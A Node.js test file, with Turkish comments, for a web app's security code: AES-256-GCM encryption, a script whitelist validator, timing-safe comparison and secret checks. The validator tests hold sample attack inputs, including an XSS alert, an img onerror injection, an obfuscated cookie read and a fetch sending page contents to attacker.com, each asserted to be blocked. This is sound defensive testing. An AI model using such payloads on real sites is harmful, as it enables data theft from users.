import './_register.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';

import { encryptData, decryptData } from '@/lib/security/encryption';
import { validateCustomBodyJs } from '@/lib/security/scriptSanitizer';
import { validateAllSecrets, requiredRedisConfig } from '@/lib/envGuard';
import { safeEqual } from '@/lib/security/safeEqual';

// Test anahtarı tanımla
process.env.ENCRYPTION_KEY = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
process.env.JWT_SECRET = 'a'.repeat(32);
process.env.IMAGE_PROXY_SECRET = 'b'.repeat(32);

// ── 1. AES-256-GCM ŞİFRELEME GÜVENLİK TESTLERİ ──────────────────────────
test('AES-256-GCM: metin şifreleme ve çözme döngüsü başarıyla çalışır (12-byte IV)', () => {
    const secretText = JSON.stringify({ client_email: 'service@project.iam.gserviceaccount.com', private_key: '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASC...' });
    const encrypted = encryptData(secretText);
    
    assert.notEqual(encrypted, secretText);
    const parts = encrypted.split(':');
    assert.equal(parts.length, 3); // iv:authTag:cipher
    assert.equal(parts[0].length, 24); // 12 byte = 24 hex karakter (NIST SP 800-38D standardı)
    assert.equal(parts[1].length, 32); // 16 byte = 32 hex karakter auth tag

    const decrypted = decryptData(encrypted);
    assert.equal(decrypted, secretText);
    const parsed = JSON.parse(decrypted);
    assert.equal(parsed.client_email, 'service@project.iam.gserviceaccount.com');
});

test('AES-256-GCM: bozuk, tahrif edilmiş veya geçersiz veriler güvenli hata fırlatır', () => {
    const encrypted = encryptData('gizli-veri');
    const [iv, tag, cipher] = encrypted.split(':');
    
    // Tahrif edilmiş ciphertext
    const tamperedCipher = cipher.slice(0, -2) + (cipher.slice(-2) === 'aa' ? 'bb' : 'aa');
    assert.throws(() => {
        decryptData(`${iv}:${tag}:${tamperedCipher}`);
    }, /Decryption failed/);

    // Tahrif edilmiş Auth Tag
    const tamperedTag = tag.slice(0, -2) + (tag.slice(-2) === '11' ? '22' : '11');
    assert.throws(() => {
        decryptData(`${iv}:${tamperedTag}:${cipher}`);
    }, /Decryption failed/);

    // Geçersiz hex kodlaması
    assert.throws(() => {
        decryptData(`not-hex-iv:${tag}:${cipher}`);
    }, /Invalid hex/);

    // Yanlış format (eksik kolonlar)
    assert.throws(() => {
        decryptData('gecersiz-format');
    }, /Invalid encrypted data format/);
});

// ── 2. CUSTOM_BODY_JS STRICT WHITELIST TESTLERİ ────────────────────────
test('custom_body_js: meşru Google Analytics / GTM / Cloudflare betikleri kabul edilir ve ayrıştırılır', () => {
    const validGtm = '<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC123XYZ"></script>\n<script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag("js", new Date()); gtag("config", "G-ABC123XYZ");</script>';
    const res = validateCustomBodyJs(validGtm);
    assert.equal(res.valid, true);
    assert.equal(res.scripts.length, 2);
    assert.equal(res.scripts[0].type, 'external');
    assert.equal(res.scripts[1].type, 'inline');

    const validCloudflare = '<script defer src="https://static.cloudflareinsights.com/beacon.min.js"></script>';
    const resCf = validateCustomBodyJs(validCloudflare);
    assert.equal(resCf.valid, true);
    assert.equal(resCf.scripts[0].type, 'external');
});

test('custom_body_js: keyfi kod çalıştırma ve obfuscation girişimleri katı beyaz liste tarafından engellenir', () => {
    // Obfuscated cookie erişimi (window['doc'+'ument']['coo'+'kie'])
    const obfuscatedCookie = '<script>const c = window["doc" + "ument"]["coo" + "kie"];</script>';
    assert.equal(validateCustomBodyJs(obfuscatedCookie).valid, false);

    // Keyfi alert / eval / Function
    const arbitraryJs = '<script>alert(document.domain);</script>';
    assert.equal(validateCustomBodyJs(arbitraryJs).valid, false);

    // String birleştirme ile zararlı kod
    const evilFetch = '<script>fetch("https://attacker.com/steal?data=" + encodeURIComponent(document.body.innerHTML));</script>';
    assert.equal(validateCustomBodyJs(evilFetch).valid, false);

    // Script dışı zararlı HTML etiketleri (img onerror, iframe, object vb.)
    const tagInjection = '<img src=x onerror=alert(1)><script async src="https://www.google-analytics.com/analytics.js"></script>';
    assert.equal(validateCustomBodyJs(tagInjection).valid, false);

    // İzin verilmeyen yabancı script kaynağı
    const untrustedSrc = '<script src="https://evil.attacker.com/malicious.js"></script>';
    assert.equal(validateCustomBodyJs(untrustedSrc).valid, false);
});

// ── 3. CRON YETKİLENDİRME VE TIMING-SAFE TESTLERİ ───────────────────────
test('cron yetkilendirme: safeEqual farklı uzunluklardaki girdilerde exception fırlatmaz ve timing-safe davranır', () => {
    const realSecret = 'my-super-secret-cron-key-12345678';
    
    // Doğru secret
    assert.equal(safeEqual(realSecret, realSecret), true);

    // Farklı uzunlukta rastgele girdiler (RangeError veya exception oluşturmamalı)
    assert.equal(safeEqual('short', realSecret), false);
    assert.equal(safeEqual(realSecret, 'short'), false);
    assert.equal(safeEqual('', realSecret), false);
    assert.equal(safeEqual(null, realSecret), false);
    assert.equal(safeEqual(undefined, realSecret), false);
    assert.equal(safeEqual('x'.repeat(500), realSecret), false);
});

// ── 4. ENVGUARD VE REDIS FAIL-CLOSED TESTLERİ ───────────────────────────
test('envGuard: production ortamında Upstash Redis yoksa ve izin verilmemişse fail-closed davranır', () => {
    const origNodeEnv = process.env.NODE_ENV;
    const origUrl = process.env.UPSTASH_REDIS_REST_URL;
    const origToken = process.env.UPSTASH_REDIS_REST_TOKEN;
    const origAllow = process.env.ALLOW_IN_MEMORY_RATE_LIMIT;

    try {
        process.env.NODE_ENV = 'production';
        delete process.env.UPSTASH_REDIS_REST_URL;
        delete process.env.UPSTASH_REDIS_REST_TOKEN;
        delete process.env.ALLOW_IN_MEMORY_RATE_LIMIT;

        assert.throws(() => {
            requiredRedisConfig();
        }, /UPSTASH_REDIS_REST_URL/);

        // ALLOW_IN_MEMORY_RATE_LIMIT ile geçici izin verilebilmeli (test modu)
        process.env.ALLOW_IN_MEMORY_RATE_LIMIT = 'true';
        const cfg = requiredRedisConfig();
        assert.equal(cfg.enabled, false);
    } finally {
        process.env.NODE_ENV = origNodeEnv;
        if (origUrl) process.env.UPSTASH_REDIS_REST_URL = origUrl; else delete process.env.UPSTASH_REDIS_REST_URL;
        if (origToken) process.env.UPSTASH_REDIS_REST_TOKEN = origToken; else delete process.env.UPSTASH_REDIS_REST_TOKEN;
        if (origAllow) process.env.ALLOW_IN_MEMORY_RATE_LIMIT = origAllow; else process.env.ALLOW_IN_MEMORY_RATE_LIMIT = 'true';
    }
});

test('envGuard: aynı değer birden fazla güvenlik anahtarı için kullanıldığında fail-closed davranır', () => {
    const origProxy = process.env.IMAGE_PROXY_SECRET;
    try {
        // IMAGE_PROXY_SECRET ile JWT_SECRET aynı yapıldığında hata vermeli
        process.env.IMAGE_PROXY_SECRET = process.env.JWT_SECRET;
        const res = validateAllSecrets({ failClosed: false });
        assert.equal(res.valid, false);
        assert.ok(res.errors.some(e => e.includes('Farklı güvenlik anahtarları')));
    } finally {
        process.env.IMAGE_PROXY_SECRET = origProxy;
    }
});
